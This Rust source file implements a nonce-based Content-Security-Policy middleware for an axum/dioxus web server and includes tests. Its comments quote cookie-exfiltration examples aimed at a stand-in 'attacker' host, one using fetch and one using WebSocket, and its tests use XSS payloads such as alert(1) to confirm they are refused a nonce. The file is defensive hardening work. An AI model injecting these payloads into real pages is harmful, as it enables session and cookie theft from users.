//! PURA-48 — Phase 2 nonce-based Content-Security-Policy.
//!
//! Generates a per-request 128-bit hex nonce, rewrites every inline
//! `<script>` open tag in HTML responses to `<script nonce="…">`, and
//! sets the `Content-Security-Policy` header per-response with that
//! nonce baked into `script-src`. This replaces the Phase 1 (PURA-47)
//! `'unsafe-inline'` trade-off.
//!
//! ## Why a body-rewriting middleware
//!
//! `dioxus-server` 0.7.7 hardcodes `<script>` (literal, no attributes)
//! in three SSR call sites (`render_before_body` / INITIALIZE_STREAMING_JS,
//! `render_after_main` / `window.initial_dioxus_hydration_data="…"`, and
//! `replace_placeholder` / `window.dx_hydrate(…)`) and exposes no nonce
//! hook on `ServeConfig`. Until upstream grows one, the body rewrite is
//! the only seam available that lets us drop `'unsafe-inline'`.
//!
//! ## What gets rewritten
//!
//! A literal `<script>` open tag (no attributes) is replaced with
//! `<script nonce="…">` **only when the bytes following the tag (after
//! stripping leading ASCII whitespace) start with one of
//! [`KNOWN_INLINE_SCRIPT_PREFIXES`]** — the four shapes the dx 0.7.x
//! stack emits: three from dioxus-server SSR and one from the dx-CLI
//! dev shell `dev.index.html` (the dx-toast template, PURA-104). Any
//! other inline `<script>` is left untouched and therefore blocked by
//! the per-request CSP nonce. External scripts in the dx-CLI prod
//! bundle use `<script type="module" async src="…"></script>` and stay
//! covered by `script-src 'self'` — the trailing `>` ensures we don't
//! touch them.
//!
//! ## Defense-in-depth posture (PURA-53)
//!
//! Earlier the rewriter nonced every literal `<script>`. That made the
//! "HTML-escape user input before SSR" rule load-bearing — a single
//! future surface (eg. rich channel descriptions, welcome messages, bot
//! templates) forgetting to escape `<` would let a stored
//! `<script>fetch('//attacker/'+document.cookie)</script>` execute under
//! our nonce, with same-origin access to `/api/*` and the auth cookie.
//!
//! The prefix-allowlist refuses to nonce anything that doesn't look like
//! a dx-emitted bootstrap script. The HTML-escape rule still applies as
//! defense-in-depth, but a single missed escape no longer collapses CSP.
//!
//! ## Buffering vs streaming
//!
//! HTML responses are fully buffered before rewrite (cap: 4 MiB). This
//! sacrifices dioxus-server's progressive suspense streaming on HTML
//! routes. Phase 1 has no `use_server_future` boundaries on user-facing
//! pages, so the response is already produced in one chunk and the loss
//! is theoretical. Revisit with a stateful streaming rewriter (carry
//! buffer of `needle.len() - 1` bytes across chunk boundaries) if a
//! future page starts relying on streaming SSR.

use axum::body::Body;
use axum::extract::Request;
use axum::http::header::{self, HeaderValue};
use axum::middleware::Next;
use axum::response::Response;
use rand::RngCore;

/// Per-request CSP nonce. Stored in request extensions so handlers or
/// server functions can read it if they ever need to emit their own
/// inline scripts (eg. JSON-LD structured data). Phase 2 has no such
/// caller — the rewrite middleware handles every dx-emitted script —
/// but exposing the nonce keeps that escape hatch open without forcing
/// callers to plumb their own.
#[derive(Clone, Debug)]
pub struct CspNonce(pub String);

/// Build the full CSP header string with the supplied nonce baked into
/// `script-src`. Every other directive is unchanged from PURA-47; see
/// [`crate::web::headers`] for the per-directive rationale.
///
/// `connect-src` intentionally lists only `'self'` (PURA-54). CSP3 treats
/// same-origin `ws://`/`wss://` upgrades as matching `'self'` when the
/// page origin is `http://`/`https://` (Chromium ≥ 99, Firefox ≥ 98,
/// Safari ≥ 15.4). The earlier `ws: wss:` schemes were a wildcard egress
/// channel — any future XSS could exfil via
/// `new WebSocket("wss://attacker/?leak=…")`. Restricting to `'self'`
/// caps that blast radius without breaking same-origin WS auth.
pub fn csp_header(nonce: &str) -> String {
    format!(
        "default-src 'self'; \
         img-src 'self' data:; \
         connect-src 'self'; \
         style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; \
         font-src 'self' https://fonts.gstatic.com data:; \
         script-src 'self' 'wasm-unsafe-eval' 'nonce-{nonce}'; \
         object-src 'none'; \
         base-uri 'self'; \
         frame-ancestors 'none'; \
         form-action 'self'"
    )
}

/// 128 bits is the OWASP-recommended floor for CSP nonces. We render as
/// hex (32 chars) rather than base64 to avoid pulling in a base64 dep
/// for a single call site — hex is ASCII-safe in CSP nonce values per
/// RFC 7636/CSP3 (any visible ASCII that survives header parsing).
const NONCE_BYTES: usize = 16;

fn make_nonce() -> String {
    let mut buf = [0u8; NONCE_BYTES];
    rand::thread_rng().fill_bytes(&mut buf);
    hex::encode(buf)
}

/// Cap on the buffered HTML response size. dx hydration data is a base64
/// VDOM blob — typically <10 KB even for the busiest dashboard route.
/// 4 MiB is generous; if a route ever blows through it we want to know.
const MAX_HTML_SIZE: usize = 4 * 1024 * 1024;

/// Body-prefix allowlist: the rewriter only nonces a `<script>` open tag
/// when the bytes that follow it (after stripping leading ASCII
/// whitespace, see [`script_body_is_dx_emitted`]) start with one of these
/// prefixes.
///
/// Pinned verbatim to the four inline `<script>` shapes the dx 0.7.x
/// stack emits into HTML the manager serves. A snapshot test imports
/// this constant so any version bump that drifts an emit shape fails CI:
///
/// - `dioxus-server-0.7.7/src/ssr.rs:717`
///   `write!(to, "<script>{INITIALIZE_STREAMING_JS}</script>")` where
///   `INITIALIZE_STREAMING_JS` is
///   `dioxus-interpreter-js-0.7.7/src/js/initialize_streaming.js`,
///   which begins with `window.hydrate_queue=[];`.
/// - `dioxus-server-0.7.7/src/ssr.rs:736`
///   `r#"<script>window.initial_dioxus_hydration_data="{raw_data}";"#`.
/// - `dioxus-server-0.7.7/src/streaming.rs:131`
///   `r#"</div><script>window.dx_hydrate([{id}], "{}""#`.
/// - `dioxus-cli-0.7.7/assets/web/dev.index.html:101-170` — the dx-toast
///   template runtime baked into the dev-shell `index.html` by
///   `prepare_html()` (PURA-104). The dx-CLI prod shell
///   (`prod.index.html`) does not contain this block, so this entry is
///   dormant in release builds. Body starts with
///   `const STORAGE_KEY = "SCHEDULED-DX-TOAST";` (preceded by HTML
///   indentation, which the leading-whitespace trim in the gate
///   absorbs).
///
/// These prefixes are intentionally fingerprint-shaped, not minimal: an
/// attacker who lands literal `<script>` in user-controlled HTML would
/// have to also reproduce the prefix bytes to slip past CSP, which is
/// strictly harder than just emitting a `<script>` tag.
pub const KNOWN_INLINE_SCRIPT_PREFIXES: &[&[u8]] = &[
    b"window.hydrate_queue=[];",
    b"window.initial_dioxus_hydration_data=\"",
    b"window.dx_hydrate(",
    b"const STORAGE_KEY = \"SCHEDULED-DX-TOAST\";",
];

/// axum middleware: generates the nonce, rewrites HTML, sets CSP.
pub async fn nonce_csp_middleware(mut req: Request, next: Next) -> Response {
    let nonce = make_nonce();
    req.extensions_mut().insert(CspNonce(nonce.clone()));

    let mut resp = next.run(req).await;

    if response_is_html(&resp) {
        let (parts, body) = resp.into_parts();
        match axum::body::to_bytes(body, MAX_HTML_SIZE).await {
            Ok(bytes) => {
                let new_body = rewrite_inline_scripts(&bytes, &nonce);
                resp = Response::from_parts(parts, Body::from(new_body));
            }
            Err(err) => {
                // Either the body was bigger than MAX_HTML_SIZE or there
                // was a transport error draining it. We can't ship the
                // un-rewritten body — every inline script would then fail
                // the CSP nonce check and the page would render blank.
                // 500 surfaces the issue immediately instead of silently
                // shipping a broken page.
                tracing::error!(%err, "nonce-csp: failed to buffer HTML response for rewrite");
                let mut error_resp =
                    Response::from_parts(parts, Body::from("Internal Server Error"));
                *error_resp.status_mut() = axum::http::StatusCode::INTERNAL_SERVER_ERROR;
                resp = error_resp;
            }
        }
    }

    let value = HeaderValue::from_str(&csp_header(&nonce))
        .expect("CSP header value is ASCII (nonce is hex, directives are static)");
    resp.headers_mut()
        .insert(header::CONTENT_SECURITY_POLICY, value);

    resp
}

fn response_is_html(resp: &Response) -> bool {
    resp.headers()
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .map(|s| s.starts_with("text/html"))
        .unwrap_or(false)
}

/// Replace `<script>` (the open tag with no attributes) with
/// `<script nonce="{nonce}">` **only when** the bytes following the tag
/// match one of [`KNOWN_INLINE_SCRIPT_PREFIXES`]. Anything else — including
/// arbitrary attacker-emitted `<script>alert(1)</script>` — is left
/// unchanged and therefore blocked by the CSP nonce policy.
///
/// Byte-level so we don't need a UTF-8 round trip and chunk boundaries
/// can't produce invalid str slices. Operates on the fully buffered body
/// so we don't have to worry about needle splits across boundaries.
fn rewrite_inline_scripts(body: &[u8], nonce: &str) -> Vec<u8> {
    const NEEDLE: &[u8] = b"<script>";
    let replacement = format!("<script nonce=\"{nonce}\">");
    let replacement = replacement.as_bytes();

    let mut out = Vec::with_capacity(body.len() + 32);
    let mut i = 0;
    while i + NEEDLE.len() <= body.len() {
        if &body[i..i + NEEDLE.len()] == NEEDLE
            && script_body_is_dx_emitted(&body[i + NEEDLE.len()..])
        {
            out.extend_from_slice(replacement);
            i += NEEDLE.len();
        } else {
            out.push(body[i]);
            i += 1;
        }
    }
    out.extend_from_slice(&body[i..]);
    out
}

/// True iff `script_body` starts with one of the dx 0.7.x inline script
/// prefixes. Defense-in-depth gate for the rewriter — see
/// [`KNOWN_INLINE_SCRIPT_PREFIXES`].
///
/// Leading ASCII whitespace is stripped before testing so the dx-CLI
/// dev-shell template (`<script>\n            const STORAGE_KEY = …`)
/// matches alongside dioxus-server's tightly-packed output (which has
/// no leading whitespace, so the trim is a no-op for those prefixes).
fn script_body_is_dx_emitted(script_body: &[u8]) -> bool {
    let trimmed = script_body.trim_ascii_start();
    KNOWN_INLINE_SCRIPT_PREFIXES
        .iter()
        .any(|prefix| trimmed.starts_with(prefix))
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::Router;
    use axum::body::Body;
    use axum::http::{Request as HttpRequest, StatusCode, header};
    use axum::middleware::from_fn;
    use axum::routing::get;
    use http_body_util::BodyExt;
    use tower::ServiceExt;

    fn router() -> Router {
        Router::new()
            .route(
                "/html",
                get(|| async {
                    let body = "<!doctype html><html><body>\
                        <script>window.initial_dioxus_hydration_data=\"abc\";</script>\
                        <script type=\"module\" src=\"/assets/main.js\"></script>\
                        <script>window.dx_hydrate([0], \"def\")</script>\
                        </body></html>";
                    axum::response::Response::builder()
                        .header(header::CONTENT_TYPE, "text/html; charset=utf-8")
                        .body(Body::from(body))
                        .unwrap()
                }),
            )
            .route(
                "/json",
                get(|| async {
                    axum::response::Response::builder()
                        .header(header::CONTENT_TYPE, "application/json")
                        .body(Body::from(r#"{"hello":"<script>"}"#))
                        .unwrap()
                }),
            )
            .layer(from_fn(nonce_csp_middleware))
    }

    async fn fetch(path: &str) -> axum::http::Response<Body> {
        let req = HttpRequest::builder()
            .uri(path)
            .body(Body::empty())
            .unwrap();
        router().oneshot(req).await.unwrap()
    }

    fn extract_nonce(csp: &str) -> &str {
        let needle = "'nonce-";
        let start = csp.find(needle).expect("CSP must contain a nonce") + needle.len();
        let end = csp[start..]
            .find('\'')
            .expect("CSP nonce must be quote-terminated")
            + start;
        &csp[start..end]
    }

    /// Extract the source list of a single CSP directive. Returns the
    /// space-separated tokens between the directive name and the next `;`.
    fn directive<'a>(csp: &'a str, name: &str) -> &'a str {
        let segment = csp
            .split(';')
            .find(|d| d.split_whitespace().next() == Some(name))
            .unwrap_or_else(|| panic!("CSP missing {name}: {csp}"));
        segment.trim().strip_prefix(name).unwrap_or(segment).trim()
    }

    #[tokio::test]
    async fn html_response_has_nonce_in_csp_and_in_inline_scripts() {
        let resp = fetch("/html").await;
        assert_eq!(resp.status(), StatusCode::OK);

        // Pull the CSP and the nonce out as owned values before consuming
        // `resp` for the body. Borrows from `resp.headers()` would prevent
        // the subsequent `into_body()` move.
        let csp = resp
            .headers()
            .get(header::CONTENT_SECURITY_POLICY)
            .and_then(|v| v.to_str().ok())
            .expect("CSP must be set")
            .to_owned();

        // PURA-48 acceptance #1: 'unsafe-inline' is gone from script-src.
        // (style-src may still carry it — Phase 2 does not touch styles.)
        let script_src = directive(&csp, "script-src");
        assert!(
            !script_src.contains("'unsafe-inline'"),
            "PURA-48 regression: script-src must NOT contain 'unsafe-inline'. Got: {csp}"
        );
        assert!(
            script_src.contains("'wasm-unsafe-eval'"),
            "regression: WASM compile still needs 'wasm-unsafe-eval'. Got: {csp}"
        );
        assert!(
            script_src.contains("'nonce-"),
            "script-src must include a 'nonce-…' source. Got: {csp}"
        );

        let nonce = extract_nonce(&csp).to_owned();
        assert_eq!(nonce.len(), 32, "expected 128-bit hex nonce");
        assert!(
            nonce.chars().all(|c| c.is_ascii_hexdigit()),
            "nonce must be hex"
        );

        let body = resp
            .into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes()
            .to_vec();
        let body = String::from_utf8(body).unwrap();
        let expected_attr = format!("<script nonce=\"{nonce}\">");
        assert!(
            body.contains(&format!(
                "{expected_attr}window.initial_dioxus_hydration_data"
            )),
            "render_after_main script must carry the nonce. Body: {body}"
        );
        assert!(
            body.contains(&format!("{expected_attr}window.dx_hydrate")),
            "replace_placeholder script must carry the nonce. Body: {body}"
        );
        // External scripts (with src=) must NOT be touched.
        assert!(
            body.contains(r#"<script type="module" src="/assets/main.js"></script>"#),
            "external scripts must remain unchanged. Body: {body}"
        );
    }

    /// Acceptance criterion: two consecutive responses get *different* nonces.
    #[tokio::test]
    async fn consecutive_responses_get_unique_nonces() {
        let r1 = fetch("/html").await;
        let r2 = fetch("/html").await;
        let csp1 = r1
            .headers()
            .get(header::CONTENT_SECURITY_POLICY)
            .unwrap()
            .to_str()
            .unwrap()
            .to_owned();
        let csp2 = r2
            .headers()
            .get(header::CONTENT_SECURITY_POLICY)
            .unwrap()
            .to_str()
            .unwrap()
            .to_owned();
        let n1 = extract_nonce(&csp1);
        let n2 = extract_nonce(&csp2);
        assert_ne!(n1, n2, "nonces must rotate per request");
    }

    /// Non-HTML responses (eg. /api JSON) still receive the CSP header but
    /// their bodies are NOT rewritten — `<script>` inside JSON is data, not
    /// markup.
    #[tokio::test]
    async fn json_response_carries_csp_but_body_is_unchanged() {
        let resp = fetch("/json").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert!(
            resp.headers()
                .get(header::CONTENT_SECURITY_POLICY)
                .is_some(),
            "JSON responses still need CSP set"
        );
        let body = resp
            .into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes()
            .to_vec();
        assert_eq!(body, br#"{"hello":"<script>"}"#);
    }

    /// PURA-54 regression: `connect-src` must list `'self'` only and must
    /// NOT carry the bare `ws:` / `wss:` schemes. Those wildcards turn any
    /// future XSS into a one-line exfil primitive
    /// (`new WebSocket("wss://attacker/?leak=" + document.cookie)`); CSP3
    /// browsers already match same-origin WS upgrades against `'self'`.
    #[test]
    fn connect_src_is_self_only_no_ws_wildcards() {
        // Use a fixed nonce so the test asserts on the directive shape, not
        // on the per-request entropy.
        let csp = csp_header("deadbeef");
        let connect_src = directive(&csp, "connect-src");
        let tokens: Vec<&str> = connect_src.split_whitespace().collect();

        assert!(
            tokens.contains(&"'self'"),
            "PURA-54: connect-src must include 'self'. Got: {csp}"
        );
        assert!(
            !tokens.contains(&"ws:"),
            "PURA-54 regression: connect-src must NOT list bare `ws:`. Got: {csp}"
        );
        assert!(
            !tokens.contains(&"wss:"),
            "PURA-54 regression: connect-src must NOT list bare `wss:`. Got: {csp}"
        );
    }

    /// PURA-53 acceptance #1: an attacker-controlled `<script>alert(1)`
    /// that survives un-escaped to the SSR pipeline must NOT pick up a
    /// nonce and therefore must be blocked by CSP.
    #[test]
    fn rewrite_refuses_to_nonce_attacker_controlled_scripts() {
        // The classic stored-XSS payload shape.
        let evil = b"<!doctype html><body><script>alert(1)</script></body>";
        let out = rewrite_inline_scripts(evil, "deadbeef");
        assert_eq!(
            out,
            evil.to_vec(),
            "PURA-53: <script>alert(1)</script> must come out unchanged (no nonce)"
        );

        // A close-but-no-cigar payload that mimics the `window.` shape but
        // doesn't match any known prefix.
        let near_miss = b"<script>window.evil=1;</script>";
        let out = rewrite_inline_scripts(near_miss, "x");
        assert_eq!(
            out,
            near_miss.to_vec(),
            "PURA-53: <script> bodies that don't start with a known dx prefix must NOT be nonced"
        );

        // Empty-body `<script></script>` is also not a dx emit shape.
        let empty = b"<script></script>";
        let out = rewrite_inline_scripts(empty, "x");
        assert_eq!(out, empty.to_vec());
    }

    /// PURA-53 acceptance #2: each of the three exact dx-server 0.7.7
    /// emit shapes IS nonced.
    #[test]
    fn rewrite_nonces_each_known_dx_prefix() {
        // 1) ssr.rs:717 — `<script>{INITIALIZE_STREAMING_JS}</script>`,
        //    JS body begins with `window.hydrate_queue=[];`.
        let body = b"<script>window.hydrate_queue=[];window.dx_hydrate=(id)=>{}</script>";
        let out = rewrite_inline_scripts(body, "n1");
        assert_eq!(
            out,
            br#"<script nonce="n1">window.hydrate_queue=[];window.dx_hydrate=(id)=>{}</script>"#
                .to_vec(),
            "INITIALIZE_STREAMING_JS bootstrap must be nonced"
        );

        // 2) ssr.rs:736 — `<script>window.initial_dioxus_hydration_data="…";"`.
        let body = br#"<script>window.initial_dioxus_hydration_data="abc";</script>"#;
        let out = rewrite_inline_scripts(body, "n2");
        assert_eq!(
            out,
            br#"<script nonce="n2">window.initial_dioxus_hydration_data="abc";</script>"#.to_vec(),
            "render_after_main hydration data script must be nonced"
        );

        // 3) streaming.rs:131 — `<script>window.dx_hydrate([id], "…"`.
        let body = br#"<script>window.dx_hydrate([0], "def")</script>"#;
        let out = rewrite_inline_scripts(body, "n3");
        assert_eq!(
            out,
            br#"<script nonce="n3">window.dx_hydrate([0], "def")</script>"#.to_vec(),
            "replace_placeholder dx_hydrate script must be nonced"
        );
    }

    /// Each prefix in the allowlist must, when used as a script body, be
    /// nonced. Catches drift between the constant and its citations
    /// without depending on free-form bodies.
    #[test]
    fn every_known_prefix_satisfies_the_gate() {
        for prefix in KNOWN_INLINE_SCRIPT_PREFIXES {
            assert!(
                script_body_is_dx_emitted(prefix),
                "KNOWN_INLINE_SCRIPT_PREFIXES entry {:?} must satisfy the gate",
                std::str::from_utf8(prefix).unwrap_or("<non-utf8>")
            );
        }
    }

    /// PURA-104: the dx-CLI dev-shell `dev.index.html` bakes a dx-toast
    /// runtime as an inline `<script>`. The body has HTML indentation
    /// (newline + leading spaces) before the JS, so the gate's
    /// leading-whitespace trim is what makes the prefix match. Without
    /// the trim, Playwright QA against `dx serve --web` blocks because
    /// the un-nonced toast script trips strict CSP and the page never
    /// finishes hydrating.
    #[test]
    fn rewrite_nonces_dx_cli_dev_shell_toast_template() {
        // Mirrors the head of `dev.index.html` from dioxus-cli 0.7.7
        // (`assets/web/dev.index.html`, lines 101-105) — `<script>`,
        // newline, twelve-space indent, then the storage-key declaration.
        let body = b"<script>\n            const STORAGE_KEY = \"SCHEDULED-DX-TOAST\";\n            let currentTimeout = null;\n        </script>";
        let out = rewrite_inline_scripts(body, "n4");
        assert!(
            out.starts_with(b"<script nonce=\"n4\">"),
            "PURA-104: dx-CLI dev-shell dx-toast template must be nonced. Got: {:?}",
            String::from_utf8_lossy(&out)
        );
        // The body bytes after the rewritten tag are unchanged — only
        // the open tag carries the new attribute.
        assert!(
            out.windows(b"const STORAGE_KEY = \"SCHEDULED-DX-TOAST\";".len())
                .any(|w| w == b"const STORAGE_KEY = \"SCHEDULED-DX-TOAST\";"),
            "rewriter must preserve the script body verbatim. Got: {:?}",
            String::from_utf8_lossy(&out)
        );
    }

    /// PURA-104 sanity: relaxing the gate to skip leading whitespace
    /// must not relax it for arbitrary bodies — an attacker payload
    /// padded with newlines/spaces (eg. via a pretty-printer that
    /// indents user content) is still refused.
    #[test]
    fn rewrite_refuses_whitespace_padded_attacker_script() {
        let evil = b"<script>\n            alert(1)\n        </script>";
        let out = rewrite_inline_scripts(evil, "x");
        assert_eq!(
            out,
            evil.to_vec(),
            "leading-whitespace trim must not let attacker payloads through"
        );

        let near_miss = b"<script>\t  window.evil=1;</script>";
        let out = rewrite_inline_scripts(near_miss, "x");
        assert_eq!(
            out,
            near_miss.to_vec(),
            "tab-prefixed near-miss must still fail the prefix gate"
        );
    }

    /// Mixed-content sanity: a single buffer with an attacker tag, a
    /// known dx tag, and an external `src=` tag must rewrite only the
    /// dx tag, leave the others byte-identical.
    #[test]
    fn rewrite_handles_mixed_content() {
        let body = br#"<script>alert(1)</script><script>window.dx_hydrate([0], "x")</script><script type="module" src="/main.js"></script>"#;
        let out = rewrite_inline_scripts(body, "x");
        assert_eq!(
            out,
            br#"<script>alert(1)</script><script nonce="x">window.dx_hydrate([0], "x")</script><script type="module" src="/main.js"></script>"#.to_vec(),
        );
    }

    /// No-tag and partial-tag inputs are still copied verbatim.
    #[test]
    fn rewrite_passes_through_when_no_full_needle() {
        let out = rewrite_inline_scripts(b"plain text", "x");
        assert_eq!(out, b"plain text");

        // A truncated `<scrip` at end-of-buffer must not panic.
        let out = rewrite_inline_scripts(b"prefix<scrip", "x");
        assert_eq!(out, b"prefix<scrip");
    }

    // PURA-55 — snapshot test against real dioxus-server SSR output.
    //
    // The fixtures above are hand-rolled — they assert that the rewriter
    // does the right thing **given the inline-script shapes we expect dx
    // to emit**. They cannot catch the failure mode where a future
    // `dioxus-server` bump changes those emit sites (eg. swaps to
    // `<script type="module">`, adds `defer`, drops one of the prefix
    // strings, or introduces a fourth shape). In that scenario the
    // hand-rolled tests still pass, the rewriter silently misses the new
    // shape, CSP blocks the un-nonced script, and the SPA renders blank
    // in production.
    //
    // This test boots a minimal `dioxus_server::serve_dioxus_application`
    // with a trivial component and `IndexHtml::ssr_only()`, layers it
    // with `nonce_csp_middleware`, drives one GET request through the
    // stack, and asserts on the **actual** rendered bytes:
    //
    // - Every `<script` opening in the body is either external (carries
    //   `src=`) **or** carries `nonce="…"` matching the CSP nonce.
    // - Every inline `<script>` body starts with one of
    //   [`KNOWN_INLINE_SCRIPT_PREFIXES`].
    //
    // A dx version bump that drifts the emit shape now fails CI rather
    // than silently breaking hydration in browsers.
    mod dx_ssr_snapshot {
        use super::super::*;
        use axum::Router;
        use axum::body::Body;
        use axum::http::{Request as HttpRequest, StatusCode, header};
        use axum::middleware::from_fn;
        use dioxus::prelude::*;
        use dioxus_server::{DioxusRouterExt, ServeConfig};
        use http_body_util::BodyExt;
        use tower::ServiceExt;

        /// Trivial root component. We deliberately avoid any
        /// `use_server_future` so the render path stays in
        /// `StreamingMode::Disabled` — the production code path for
        /// every PURA-5 page in Phase 1.
        #[allow(non_snake_case)]
        fn Trivial() -> Element {
            rsx! {
                div { "hello world" }
            }
        }

        /// Drive one GET through `serve_api_application` + the nonce
        /// middleware and return `(csp_header, rewritten_body_bytes)`.
        ///
        /// We use `serve_api_application` rather than
        /// `serve_dioxus_application` because the latter calls
        /// `serve_static_assets`, which panics if the
        /// `<exe-dir>/public` directory does not exist (the case under
        /// `cargo test` when no dx bundle has been copied). The two
        /// helpers wire the same SSR `render_handler` — the inline
        /// `<script>` tags we are testing come from the renderer, not
        /// from the static-asset router.
        ///
        /// Likewise we point `DIOXUS_PUBLIC_PATH` at a non-existent
        /// location so `ServeConfig::new()` falls back to its built-in
        /// SSR-only `index.html`. Without this the test could pick up a
        /// stale `target/debug/deps/public/index.html` from a previous
        /// `dx build` and our assertions would depend on whatever inline
        /// scripts that bundle happens to carry.
        async fn render_through_nonce_middleware() -> (String, Vec<u8>) {
            // SAFETY: env mutation is process-global. No other test in
            // this module reads DIOXUS_PUBLIC_PATH, and ServeConfig::new
            // only consults it during construction (below) — so the brief
            // window during which it's set cannot influence parallel
            // tests that don't touch dioxus-server.
            unsafe {
                std::env::set_var("DIOXUS_PUBLIC_PATH", "/nonexistent-pura55-public");
            }
            let serve_cfg = ServeConfig::new();
            let router: Router = Router::new()
                .serve_api_application(serve_cfg, Trivial)
                .layer(from_fn(nonce_csp_middleware));

            let req = HttpRequest::builder().uri("/").body(Body::empty()).unwrap();
            let resp = router.oneshot(req).await.expect("dx render must not error");
            assert_eq!(resp.status(), StatusCode::OK, "dx render must return 200");

            let csp = resp
                .headers()
                .get(header::CONTENT_SECURITY_POLICY)
                .and_then(|v| v.to_str().ok())
                .expect("nonce middleware must set CSP")
                .to_owned();

            let body = resp
                .into_body()
                .collect()
                .await
                .expect("body must drain")
                .to_bytes()
                .to_vec();
            (csp, body)
        }

        /// Walk every `<script` opening tag in `body`. For each, return
        /// `(opening_tag, inline_body_or_empty)`. External `src=` tags
        /// have an empty inline body. A missing `</script>` close panics
        /// — we want loud failures on malformed output.
        fn iter_script_tags(body: &str) -> Vec<(String, String)> {
            let mut out = Vec::new();
            let mut idx = 0;
            while let Some(rel) = body[idx..].find("<script") {
                let abs = idx + rel;
                let tag_end_rel = body[abs..]
                    .find('>')
                    .expect("malformed <script: missing closing >");
                let tag_end = abs + tag_end_rel;
                let opening = body[abs..=tag_end].to_string();

                // Self-closing case `<script .../>` is not an HTML5 thing
                // for the script element (browsers ignore it), but be safe.
                let inline_body = if opening.ends_with("/>") {
                    String::new()
                } else if opening.contains(" src=") || opening.contains("\tsrc=") {
                    // External script: skip to the first `</script>` so we
                    // don't trip on the empty body.
                    String::new()
                } else {
                    let body_start = tag_end + 1;
                    let close_rel = body[body_start..]
                        .find("</script>")
                        .expect("malformed <script: missing </script>");
                    body[body_start..body_start + close_rel].to_string()
                };

                // Always advance past `</script>` (or end of opening for
                // self-close) so we don't re-find the same tag.
                let after_close = body[tag_end..]
                    .find("</script>")
                    .map(|r| tag_end + r + "</script>".len())
                    .unwrap_or(tag_end + 1);
                idx = after_close;

                out.push((opening, inline_body));
            }
            out
        }

        #[tokio::test]
        async fn real_dx_ssr_inline_scripts_all_carry_nonce_and_known_prefix() {
            let (csp, body_bytes) = render_through_nonce_middleware().await;
            let body = String::from_utf8(body_bytes).expect("dx output must be UTF-8");

            // Pull the per-request nonce out of the CSP header so we can
            // assert that each inline script carries the *same* token.
            let nonce_needle = "'nonce-";
            let start =
                csp.find(nonce_needle).expect("CSP must contain a nonce") + nonce_needle.len();
            let end = csp[start..]
                .find('\'')
                .expect("CSP nonce must be quote-terminated")
                + start;
            let nonce = &csp[start..end];
            assert_eq!(nonce.len(), 32, "expected 128-bit hex nonce, got {nonce:?}");
            let expected_attr = format!(r#"nonce="{nonce}""#);

            // Sanity: the dx render must actually have produced inline
            // scripts. If dx ever stops emitting any inline script (eg.
            // moves to an external bootstrap), this guard fires and we
            // re-evaluate the rewriter strategy explicitly rather than
            // silently passing a vacuous test.
            let scripts = iter_script_tags(&body);
            let inline_count = scripts.iter().filter(|(_, b)| !b.is_empty()).count();
            assert!(
                inline_count >= 1,
                "expected at least one inline <script> in dx SSR output. \
                 dx may have changed its bootstrap strategy. Body: {body}"
            );

            for (opening, inline) in &scripts {
                if inline.is_empty() {
                    // External or self-closing: must NOT have been touched
                    // (we only nonce inline tags); skip.
                    continue;
                }

                // (1) Every inline <script> must carry the per-request
                // nonce. If the rewriter regresses to miss any inline
                // shape dx emits, this assertion fires.
                assert!(
                    opening.contains(&expected_attr),
                    "PURA-55: inline <script> emitted by dx-server must carry nonce. \
                     Tag: {opening:?}\nExpected nonce attr: {expected_attr}\nFull body: {body}"
                );

                // (2) Every inline <script> body must start with one of
                // the known dx-server emit prefixes. If a dx version bump
                // introduces a fourth shape, this assertion fires —
                // forcing us to extend the allowlist consciously rather
                // than discover the gap when the SPA renders blank.
                assert!(
                    KNOWN_INLINE_SCRIPT_PREFIXES
                        .iter()
                        .any(|p| inline.as_bytes().starts_with(p)),
                    "PURA-55: inline <script> body does not match any \
                     KNOWN_INLINE_SCRIPT_PREFIXES entry. dx-server may have \
                     changed its emit shape. Update the allowlist (and \
                     audit the new prefix for XSS gadgets) before merging.\n\
                     Body prefix (first 200 bytes): {prefix:?}\n\
                     Allowed prefixes: {allowed:?}",
                    prefix = &inline.as_bytes()[..inline.len().min(200)],
                    allowed = KNOWN_INLINE_SCRIPT_PREFIXES
                        .iter()
                        .map(|p| std::str::from_utf8(p).unwrap_or("<non-utf8>"))
                        .collect::<Vec<_>>(),
                );
            }
        }
    }
}
